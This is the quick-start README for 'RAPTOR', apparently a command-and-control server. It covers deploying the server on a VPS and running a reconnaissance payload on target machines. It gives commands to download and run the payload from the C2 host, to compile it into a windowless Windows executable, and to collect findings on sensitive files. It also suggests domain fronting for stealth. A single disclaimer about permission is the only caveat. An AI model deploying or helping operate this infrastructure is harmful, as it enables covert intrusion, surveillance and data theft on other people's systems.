# 🚀 RAPTOR Cloud Deployment - Quick Start Guide

**Get your RAPTOR C2 server running on a cloud VPS in minutes!**

---

## 📦 What You'll Need

1. **Cloud VPS** (any provider):
   - Ubuntu 20.04+ or Debian 11+
   - 2+ GB RAM
   - Public IP address
   - SSH access

2. **Target VM** (where payload runs):
   - Windows 10+ or Linux
   - Python 3.10+
   - Internet access

3. **Domain** (optional):
   - For SSL/HTTPS
   - Can use Cloudflare, Namecheap, etc.

---

## ⚡ Fast Deployment (3 Methods)

### Method 1: Automated Script (Recommended) ⭐

**On your VPS:**

```bash
# 1. SSH into your VPS
ssh root@your-vps-ip

# 2. Download and run deployment script
wget https://raw.githubusercontent.com/yourusername/raptor/main/deploy_to_vps.sh
chmod +x deploy_to_vps.sh
sudo ./deploy_to_vps.sh

# 3. Follow the prompts:
#    - Enter your domain/IP
#    - Enter GitHub username
#    - Choose SSL (y/n)
#    - Create admin credentials

# 4. Done! Your C2 is live at: http(s)://your-domain.com
```

**That's it! The script handles everything automatically.**

---

### Method 2: Manual Setup

See [`docs/CLOUD_DEPLOYMENT.md`](./CLOUD_DEPLOYMENT.md) for detailed step-by-step instructions.

---

### Method 3: Docker (Coming Soon)

```bash
docker-compose up -d
```

---

## ✅ Test Your Deployment

**From your local machine:**

```bash
# Test connectivity
./test_cloud_deployment.sh https://your-domain.com

# Or manually
curl -X POST https://your-domain.com/api/submit_scan/ \
  -H "Content-Type: application/json" \
  -d '{"recon_data":{"hostname":"test"}}'
```

**Expected response:**

```json
{
  "session_id": "123e4567-e89b-12d3-a456-426614174000",
  "status": "recon",
  "message": "Scan submitted successfully"
}
```

---

## 🎯 Run Payload on Target VM

### Option 1: Use Pre-configured Script

**1. Edit configuration:**

```bash
# On target VM, download payload
curl -O https://your-domain.com/static/payload_cloud.py

# Edit C2 server address
nano payload_cloud.py
```

Change:
```python
C2_SERVER = "http://127.0.0.1:8000"  # ⚠️ CHANGE THIS!
```

To:
```python
C2_SERVER = "https://your-domain.com"  # ✅ Your VPS
```

**2. Install dependencies:**

```bash
pip3 install psutil requests
```

**3. Run payload:**

```bash
python3 payload_cloud.py
```

---

### Option 2: Compile to Executable (Windows)

**On your development machine:**

```bash
# Install PyInstaller
pip install pyinstaller

# Edit payload_cloud.py (set C2_SERVER)
nano payload_cloud.py

# Compile
pyinstaller --onefile --noconsole payload_cloud.py

# Transfer dist/payload_cloud.exe to target VM
```

**On target Windows VM:**

```cmd
payload_cloud.exe
```

---

## 📊 Monitor Your Sessions

### Web Dashboard

Visit: `https://your-domain.com/admin/`

- Login with superuser credentials
- View all sessions
- Download generated reports

### API Monitoring

```bash
# Check session status
curl https://your-domain.com/api/session/<session-id>/

# Example response
{
  "session_id": "...",
  "status": "complete",
  "report_path": "/media/reports/report_test-system.pdf",
  "summary": {
    "overall_risk_level": "medium",
    "sensitive_files_found": 12,
    "total_findings": 45
  }
}
```

### Server Logs

**On VPS:**

```bash
# Real-time logs
sudo journalctl -u raptor -f

# Last 50 lines
sudo journalctl -u raptor -n 50

# Nginx logs
sudo tail -f /var/log/nginx/raptor_access.log
```

---

## 🔧 Common Operations

### Restart C2 Server

```bash
sudo systemctl restart raptor
```

### Update Code

```bash
sudo su - raptor
cd raptor
git pull
exit
sudo systemctl restart raptor
```

### View Status

```bash
sudo systemctl status raptor
sudo systemctl status nginx
```

### Backup Database

```bash
sudo cp /home/raptor/raptor/src/c2/db.sqlite3 ~/backup_$(date +%Y%m%d).sqlite3
```

---

## 🛡️ Security Checklist

- [ ] Changed Django SECRET_KEY
- [ ] DEBUG = False in production
- [ ] SSL/HTTPS enabled
- [ ] Firewall configured (ports 22, 80, 443)
- [ ] Strong admin password
- [ ] Regular system updates
- [ ] IP whitelisting (if applicable)
- [ ] Fail2ban installed
- [ ] Regular backups

---

## 🐛 Troubleshooting

### Payload Can't Connect

```bash
# Check if C2 is running
sudo systemctl status raptor

# Check firewall
sudo ufw status

# Test from payload VM
curl -v https://your-domain.com/api/submit_scan/
```

### 502 Bad Gateway

```bash
# Restart services
sudo systemctl restart raptor
sudo systemctl restart nginx

# Check logs
sudo journalctl -u raptor -n 50
```

### SSL Certificate Issues

```bash
# Renew certificate
sudo certbot renew

# Test renewal
sudo certbot renew --dry-run
```

---

## 📁 File Locations on VPS

```
/home/raptor/raptor/           # Application root
├── src/c2/                    # Django C2 server
│   ├── db.sqlite3             # Database
│   ├── media/reports/         # Generated reports
│   └── staticfiles/           # Static assets
├── logs/                      # Application logs
│   ├── django.log
│   ├── gunicorn_access.log
│   └── gunicorn_error.log
├── venv/                      # Python virtual environment
└── gunicorn_config.py         # Gunicorn configuration

/etc/systemd/system/raptor.service  # Systemd service
/etc/nginx/sites-available/raptor   # Nginx config
/var/log/nginx/raptor_*.log         # Nginx logs
```

---

## 🎓 Architecture Diagram

```
┌─────────────────────────────────────────────────┐
│           Internet                              │
└─────────────────┬───────────────────────────────┘
                  │
                  │ HTTPS (Port 443)
                  │
┌─────────────────▼───────────────────────────────┐
│  Your VPS (Ubuntu 20.04)                        │
│                                                  │
│  ┌────────────────────────────────────────┐    │
│  │  Nginx (Reverse Proxy + SSL)           │    │
│  │  Port 80/443 → 127.0.0.1:8000          │    │
│  └────────────┬───────────────────────────┘    │
│               │                                  │
│  ┌────────────▼───────────────────────────┐    │
│  │  Gunicorn (WSGI Server)                │    │
│  │  Workers: CPU * 2 + 1                  │    │
│  └────────────┬───────────────────────────┘    │
│               │                                  │
│  ┌────────────▼───────────────────────────┐    │
│  │  Django 5.2.5 (RAPTOR C2)              │    │
│  │  ├── API Endpoints                     │    │
│  │  ├── AI Models (LightGBM)              │    │
│  │  ├── Report Generator                  │    │
│  │  └── Database (SQLite)                 │    │
│  └────────────────────────────────────────┘    │
│                                                  │
│  Managed by: systemd (auto-restart)             │
└──────────────────────────────────────────────────┘
                  ▲
                  │ POST /api/submit_scan/
                  │
┌─────────────────┴───────────────────────────────┐
│  Target VM (Windows/Linux)                      │
│                                                  │
│  ┌────────────────────────────────────────┐    │
│  │  payload_cloud.py                      │    │
│  │  ├── System reconnaissance             │    │
│  │  ├── File enumeration                  │    │
│  │  └── C2 communication                  │    │
│  └────────────────────────────────────────┘    │
└──────────────────────────────────────────────────┘
```

---

## 📚 Documentation Index

- **Full Deployment Guide**: [`docs/CLOUD_DEPLOYMENT.md`](./docs/CLOUD_DEPLOYMENT.md)
- **Architecture**: [`docs/ARCHITECTURE.md`](./docs/ARCHITECTURE.md)
- **Implementation Plan**: [`docs/IMPLEMENTATION_PLAN.md`](./docs/IMPLEMENTATION_PLAN.md)
- **Module Documentation**: [`docs/MODULE_*_COMPLETE.md`](./docs/)
- **Project Summary**: [`docs/PROJECT_SUMMARY.md`](./docs/PROJECT_SUMMARY.md)

---

## 🎯 Quick Command Reference

| Task | Command |
|------|---------|
| **Deploy C2** | `sudo ./deploy_to_vps.sh` |
| **Test Deployment** | `./test_cloud_deployment.sh https://your-domain.com` |
| **Start C2** | `sudo systemctl start raptor` |
| **Stop C2** | `sudo systemctl stop raptor` |
| **Restart C2** | `sudo systemctl restart raptor` |
| **View Logs** | `sudo journalctl -u raptor -f` |
| **Check Status** | `sudo systemctl status raptor` |
| **Run Payload** | `python3 payload_cloud.py` |
| **Admin Panel** | `https://your-domain.com/admin/` |
| **Renew SSL** | `sudo certbot renew` |

---

## 💡 Pro Tips

1. **Use HTTPS**: Get free SSL from Let's Encrypt
2. **Whitelist IPs**: If you know target VM IPs in advance
3. **Rate Limiting**: Prevent abuse with nginx rate limits
4. **Backup Regularly**: Automate database backups with cron
5. **Monitor Resources**: Use `htop` to watch CPU/RAM
6. **Log Rotation**: Configure logrotate for log management
7. **Use PostgreSQL**: For production, upgrade from SQLite
8. **Domain Fronting**: Consider using CDN for stealth

---

## ❓ FAQ

**Q: Can I use an IP address instead of a domain?**  
A: Yes! Just use `http://your-vps-ip` (no SSL without domain)

**Q: How much does a VPS cost?**  
A: $5-10/month (DigitalOcean, Linode, Vultr, etc.)

**Q: Is SQLite okay for production?**  
A: For light use, yes. For heavy traffic, use PostgreSQL.

**Q: Can I run multiple payloads simultaneously?**  
A: Yes! Each gets its own session ID.

**Q: How do I update RAPTOR after deployment?**  
A: `git pull` in the raptor directory, then restart service.

**Q: Is this legal?**  
A: Only use on systems you own or have explicit permission to test!

---

## 🎉 Success Criteria

Your deployment is successful when:

✅ C2 server responds at your domain/IP  
✅ Test API call returns session_id  
✅ Payload can connect from target VM  
✅ Admin panel accessible  
✅ PDF reports generate successfully  
✅ Logs show successful processing  

---

**Need help? Check the full guide: [`docs/CLOUD_DEPLOYMENT.md`](./docs/CLOUD_DEPLOYMENT.md)**

**Happy hacking! 🚀**
